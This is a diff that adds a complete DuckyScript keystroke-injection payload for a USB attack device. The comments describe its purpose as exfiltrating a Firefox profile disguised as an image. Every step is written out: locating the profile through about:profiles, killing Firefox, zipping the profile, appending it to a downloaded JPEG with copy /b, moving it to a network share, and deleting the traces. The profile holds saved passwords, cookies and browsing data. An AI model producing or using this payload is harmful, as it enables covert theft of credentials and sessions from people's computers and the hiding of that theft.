@@ -1,0 +1,58 @@
+REM exfiltrate Firefox profile as an image to a shared directory
+REM replace ImageUrlHere with the URL of your preferred image
+REM replace NetworkShareHere with network shared directory
+DELAY 500
+GUI r
+DELAY 400
+STRING firefox
+DELAY 300
+ENTER
+DELAY 2000
+CONTROL l
+DELAY 100
+STRING about:profiles
+DELAY 200
+ENTER
+DELAY 300
+TAB
+REPEAT 3
+DELAY 200
+ENTER
+DELAY 300
+ALT d
+DELAY 200
+CONTROL c
+DELAY 200
+ALT f
+DELAY 300
+STRING c
+DELAY 300
+GUI r
+DELAY 400
+STRING powershell
+DELAY 500
+ENTER
+DELAY 1300
+STRING taskkill /IM "firefox.exe" /F
+ENTER
+DELAY 400
+STRING (New-Object System.Net.WebClient).DownloadFile
+STRING ("ImageUrlHere", "$home\Pictures\wall032.jpg");
+SPACE
+STRING Compress-Archive -Path 
+CONTROL v
+DELAY 200
+SPACE
+STRING -DestinationPath $home\Music\FFPrfl.zip;
+SPACE
+STRING (cmd /c copy /b %USERPROFILE%\Pictures\wall032.jpg
+STRING +%USERPROFILE%\Music\FFPrfl.zip %USERPROFILE%\Music\wall033.jpg);
+SPACE
+STRING Move-Item -Path $home\Music\wall033.jpg -Destination \\NetworkShareHere;
+SPACE
+STRING Remove-Item -Path $home\Music\FFPrfl.zip;
+SPACE
+STRING Remove-Item -Path $home\Pictures\wall032.jpg; exit
+ENTER
+DELAY 200
+GUI DOWNARROW
